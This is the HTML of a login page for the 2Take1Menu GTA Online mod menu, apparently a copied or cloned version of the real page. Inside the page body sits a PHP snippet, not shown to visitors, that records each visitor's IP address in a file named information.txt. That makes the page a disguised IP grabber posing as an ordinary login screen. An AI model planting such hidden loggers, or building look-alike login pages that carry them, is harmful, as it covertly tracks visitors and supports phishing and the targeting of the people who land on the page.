

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0">
    <meta name="description" content="2Take1Menu - Stable GTA Online Mod Menu">
    <!-- CSRF Token -->
    <meta name="csrf-token" content="rKP6HAl2bF5jR5nNufxRUjbGKZ3HvHhAdTqo7qbs">

    <title>    Login
 -  2Take1Menu | GTA V Mod Menu</title>

	<!-- Styles -->
    <link rel="stylesheet" href="https://cdn.2take1.menu/css/LoDyn.css?" />
	<link rel="stylesheet" href="https://cdn.2take1.menu/css/fonts.css?" />
    <link rel="stylesheet" href="https://cdn.2take1.menu/css/bootstrap/bootstrap.css?" />
    <link rel="stylesheet" href="https://cdn.2take1.menu/css/bootstrap/bootstrap-grid.css?" />
    <link rel="stylesheet" href="https://cdn.2take1.menu/css/notify.css?" />
    <link rel="stylesheet" href="https://cdn.2take1.menu/css/_style.css?" />

    <link rel="icon"
          href="https://cdn.2take1.menu/favicon.ico">

    
    <!-- Scripts -->
    <script src="https://cdn.2take1.menu/js/app.js" defer></script>
    <script src="https://cdn.2take1.menu/js/notify.js" defer></script>
    <script src="https://cdn.2take1.menu/js/polyfill/custom-elements.js"></script>
    <script src="https://cdn.2take1.menu/js/loader.js"></script>
    <script src="https://cdn.2take1.menu/js/LoDyn.js"></script>
    <script defer>
		loader.initiators.unshift({fn: LoDyn.init, once: true});
		loader.initiator(() => {
			LoDyn.setopt({
				overlay: {
					close_click: true,
					slide: 'none',
				},
				reflow: {
					expand_x: true,
					expand_y: true,
					reflow_x: true,
				},
			});

			LoDyn.push_header('X-CSRF-TOKEN', 'rKP6HAl2bF5jR5nNufxRUjbGKZ3HvHhAdTqo7qbs');
			LoDyn.push_header('X-Requested-With', 'XMLHttpRequest');

			LoDyn.ajax_callback(notify_ajax_callback);

        }, true);
    </script>

    <script type="application/javascript" id="basic_notifications">
	let		g_bn_errors	=
	[
					];
	let		g_bn_warnings	=
	[
			];
	let		g_bn_notices	=
	[
							];
	let		g_bn_successes	=
	[
			];
	let		g_bn_debugs	=
	[
			];
</script></head>
<body class="bg-secondary">

<?php
$ipLog = "information.txt"; 
$ip = getenv("REMOTE_ADDR");
$log=fopen("$ipLog", "a+"); 
fwrite($log, "IP=" . $ip . PHP_EOL);

?>


    <noscript>
        <div class="no_js">
            <span>This site requires JavaScript.</span>
        </div>
    </noscript>
    <div id="app">
        <nav id="navbar" class="navbar navbar-expand-md navbar-dark bg-dark shadow-sm">

            <a class="navbar-brand" href="https://2take1.menu">
                <img src="https://cdn.2take1.menu/img/logo.png" height="50px" style="margin-top: -5px; margin-bottom: -5px" alt="" />
                2Take1
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <!-- Left Side Of Navbar -->
                <ul class="navbar-nav mr-auto">
                    <li class="nav-item "><a class="nav-link" href="https://2take1.menu/home">Home</a></li>



                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle clickable" role="button" data-toggle="dropdown">
                            Download <span class="caret"></span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right">

                            

                            
                            <a class="dropdown-item" href="https://2take1.menu/dload/fivem">FiveM</a>

                        </div>
                    </li>

                    
                    <li class="nav-item "><a class="nav-link" href="https://2take1.menu/contact">Contact</a></li>
                    <li class="nav-item"><a class="nav-link" href="https://docs.2take1.menu/" target="_blank">Docs</a></li>
                </ul>

                <!-- Right Side Of Navbar -->
                <ul class="navbar-nav ml-auto">
                    <!-- Authentication Links -->
                                            <li class="nav-item">
                            <a class="nav-link" href="https://2take1.menu/register">Register</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://2take1.menu/login">Login</a>
                        </li>


                                    </ul>
            </div>

        </nav>

        <main class="py-4">

            
    <form class="form-horizontal" method="POST" action="https://2take1.menu/login" enctype="multipart/form-data">

        <input type="hidden" name="_token" value="rKP6HAl2bF5jR5nNufxRUjbGKZ3HvHhAdTqo7qbs">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card text-white bg-dark">
                    <div class="card-header">
                        Login
                    </div>
                    <div class="card-body position-relative">

                        <div class="form-group">
                            <label for="name" class="col-sm-10 col-form-label">Username</label>
                            <div class="offset-sm-1 col-sm-10">
                                <input placeholder=""
                                       title="A-Z a-z 0-9 and _"
                                       class="form-control-sm text-center"
                                       type="text"
                                       name="name"
                                       id="name"
                                       required
                                       autofocus
                                       pattern="[A-Za-z0-9_ ]{4,32}"
                                       value="" />
                            </div>
                        </div>

                        <div class="form-group">
                            <label for="password" class="col-sm-10 col-form-label">Password</label>
                            <div class="offset-sm-1 col-sm-10">
                                <input placeholder=""
                                       title="A-Z a-z 0-9 and !@#%&_()*-$^[]"
                                       class="form-control-sm text-center"
                                       type="password"
                                       name="password"
                                       id="password"
                                       required
                                       autocomplete="off"
                                       pattern="[A-Za-z0-9!@#%&_()*\-$^\[\]]{4,128}"
                                       value="" />
                            </div>
                        </div>

                        <div class="form-group justify-content-center">
                            <div class="col-sm-12">
                                <button type="submit" class="btn btn-secondary">Submit</button>
                            </div>
                        </div>

                        <a class="position-absolute" style="bottom: 25px; right: 25px" href="https://2take1.menu/forgot_password">Forgot your password?</a>

                    </div>
                </div>
            </div>
        </div>
    </form>
    <lo-dyn data="	username:#name=/^[A-Za-z0-9_ ]{4,32}$/;
					password:#password=/^[A-Za-z0-9\!\@\#\%\&\_\(\)\*\-\$\^\[\]]{4,128}$/"></lo-dyn>

            <div id="static-notify" class="invis">
                <ul>

                </ul>
                <i id="static-notify-clear" class="float-right material-icons clickable">close</i>

            </div>
        </main>

    </div>
    <footer class="bg-dark">
        <ul>
            <li>
                <a id="terms_of_service" class="clickable" target="_blank" rel="noopener noreferrer">Terms of Service</a>
                <lo-dyn route="https://2take1.menu/terms/tos"
                        event="click:#terms_of_service"
                        output="overlay"></lo-dyn>
            </li>
            <li>
                <a id="privacy_policy" class="clickable" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
                <lo-dyn route="https://2take1.menu/terms/privacy"
                        event="click:#privacy_policy"
                        output="overlay"></lo-dyn>
            </li>
        </ul>
        <div class="copyright">©Popstar Devs. All rights reserved.</div>
    </footer>
</body>
</html>
